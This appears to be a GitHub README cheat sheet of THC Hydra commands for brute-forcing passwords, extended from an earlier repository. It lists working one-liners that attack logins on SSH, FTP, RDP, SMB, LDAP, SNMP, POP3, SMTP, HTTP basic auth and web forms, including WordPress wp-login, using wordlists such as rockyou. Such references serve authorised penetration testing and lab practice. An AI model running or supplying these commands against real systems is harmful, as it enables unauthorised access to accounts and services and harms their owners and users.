# Hydra-Cheatsheet
[Original](https://github.com/frizb/Hydra-Cheatsheet), this one is four years old so I made some additions.

Hydra Password Cracking Cheetsheet

```bash
# Command 								Description:

hydra -P password-file.txt -v $ip snmp 					# Hydra brute force against SNMP
hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp 	# Hydra FTP known user and rockyou password list
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh 		# Hydra SSH using list of users and passwords
hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh 			# Hydra SSH using a known password and a username list
hydra $ip -s 22 ssh -l -P big_wordlist.txt 				# Hydra SSH Against Known username on port 22
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V 	# Hydra POP3 Brute Force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V 			# Hydra SMTP Brute Force
hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin 		# Hydra attack http get 401 login with a dictionary
hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://$ip 		# Hydra attack Windows Remote Desktop with rockyou
hydra -t 1 -V -f -l administrator -P rockyou.txt $ip smb 		# Hydra brute force SMB user with rockyou

# Hydra HTTP Basic Authenication Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip -s $port -f http-get / 

# Hydra brute force a Wordpress admin login
hydra -l username -P wordlist.txt -f 10.10.71.232 http-post-form "/login.php/:username=^USER^&password=^PASS^:F=incorrect" # READ THE SOURCE
hydra -l admin -P ./passwordlist.txt $ip -V http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' 

hydra -L usernames.txt -P passwords.txt $ip smb -V -f 			# SMB Brute Forcing
hydra -L users.txt -P passwords.txt $ip ldap2 -V -f 			# LDAP Brute Forcing

# Need a cookie

...F=incorrect:H=Cookie:...
```


## References
[Frizb's Hydra Cheatsheet(Original)](https://github.com/frizb/Hydra-Cheatsheet)